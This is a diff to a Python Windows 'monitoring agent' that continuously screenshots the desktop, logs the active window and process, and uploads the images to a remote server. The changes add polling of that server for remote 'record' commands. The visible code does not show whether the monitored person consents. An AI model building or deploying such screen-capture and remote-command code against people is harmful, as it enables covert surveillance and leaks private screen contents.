@@ -17,7 +17,7 @@ import win32gui
 import win32process
 from PIL import ImageGrab
 
-SERVER_URL = "http://88.222.221.40:5050/upload"
+SERVER_URL = "https://server-dm3i.onrender.com"
 PC_NAME = socket.gethostname()
 INTERVAL_RANGE = (1.0, 1.5)
 JPEG_QUALITY = 38
@@ -27,6 +27,7 @@ REQUEST_TIMEOUT = 10
 MAX_RETRIES = 3
 VIDEO_ROOT = Path("videos")
 VIDEO_FPS = 1
+COMMAND_POLL_SECONDS = 2
 
 
 def take_screenshot():
@@ -41,15 +42,30 @@ def image_to_numpy(image):
     return np.array(image.convert("RGB"), dtype=np.uint8)
 
 
-def has_significant_change(current_frame, previous_frame, threshold):
-    if previous_frame is None:
+def get_flattened_data(image):
+    if hasattr(image, "get_flattened_data"):
+        return image.get_flattened_data()
+    return list(image.getdata())
+
+
+def has_significant_change(current_image, previous_image, threshold):
+    if previous_image is None:
         return True
 
-    if current_frame.shape != previous_frame.shape:
+    current_small = current_image.convert("L").resize((96, 54))
+    previous_small = previous_image.convert("L").resize((96, 54))
+
+    current_data = get_flattened_data(current_small)
+    previous_data = get_flattened_data(previous_small)
+
+    if len(current_data) != len(previous_data):
         return True
 
-    diff = np.abs(current_frame.astype(np.int16) - previous_frame.astype(np.int16))
-    return float(diff.mean()) >= threshold
+    diff_sum = 0.0
+    for c, p in zip(current_data, previous_data):
+        diff_sum += abs(float(c) - float(p))
+    diff_mean = diff_sum / len(current_data)
+    return diff_mean >= threshold
 
 
 def get_active_window_info():
@@ -95,13 +111,43 @@ def post_with_retry(url, data, jpeg_bytes, retries, timeout):
         try:
             files = {"screenshot": ("screen.jpg", io.BytesIO(jpeg_bytes), "image/jpeg")}
             response = requests.post(url, data=data, files=files, timeout=timeout)
-            response.raise_for_status()
+            if response.status_code != 200:
+                print(f"Yukleme xetasi: {response.status_code} {response.text}")
+                if attempt < retries:
+                    time.sleep(0.5 * attempt)
+                continue
             return True
         except requests.RequestException as exc:
             print(f"Upload failed ({attempt}/{retries}): {exc}")
             if attempt < retries:
                 time.sleep(0.5 * attempt)
     return False
+
+
+def get_command(pc_name):
+    try:
+        response = requests.get(
+            f"{SERVER_URL}/api/command/{pc_name}",
+            timeout=REQUEST_TIMEOUT,
+        )
+        if response.status_code == 200:
+            return response.json()
+        print(f"Command xetasi: {response.status_code} {response.text}")
+    except requests.RequestException as exc:
+        print(f"Command sorgusu xetasi: {exc}")
+    return {"command": "none"}
+
+
+def send_record_request(pc_name):
+    try:
+        response = requests.post(
+            f"{SERVER_URL}/agent/{pc_name}/record",
+            timeout=REQUEST_TIMEOUT,
+        )
+        if response.status_code != 200:
+            print(f"Record request xetasi: {response.status_code} {response.text}")
+    except requests.RequestException as exc:
+        print(f"Record request gonderilemedi: {exc}")
 
 
 def ensure_video_dir(pc_name):
@@ -163,9 +209,19 @@ def main():
     print(f"Monitoring agent started: {PC_NAME}")
 
     previous_frame = None
+    previous_image = None
     frame_buffer = deque(maxlen=BUFFER_SIZE)
+    last_command_poll = 0.0
 
     while True:
+        now = time.time()
+        if now - last_command_poll >= COMMAND_POLL_SECONDS:
+            command = get_command(PC_NAME)
+            last_command_poll = now
+            if command.get("command") == "record":
+                write_latest_video(list(frame_buffer), PC_NAME)
+                send_record_request(PC_NAME)
+
         screenshot = take_screenshot()
         if screenshot is not None:
             frame = image_to_numpy(screenshot)
@@ -174,13 +230,14 @@ def main():
             if len(frame_buffer) == BUFFER_SIZE:
                 write_latest_video(list(frame_buffer), PC_NAME)
 
-            if has_significant_change(frame, previous_frame, DIFF_THRESHOLD):
+            if has_significant_change(screenshot, previous_image, DIFF_THRESHOLD):
                 previous_frame = frame
+                previous_image = screenshot.copy()
                 image_bytes = encode_jpeg_bytes(screenshot, JPEG_QUALITY)
                 active_window, active_process = get_active_window_info()
                 payload = build_payload(active_window, active_process)
                 ok = post_with_retry(
-                    SERVER_URL,
+                    f"{SERVER_URL}/upload",
                     payload,
                     image_bytes,
                     retries=MAX_RETRIES,
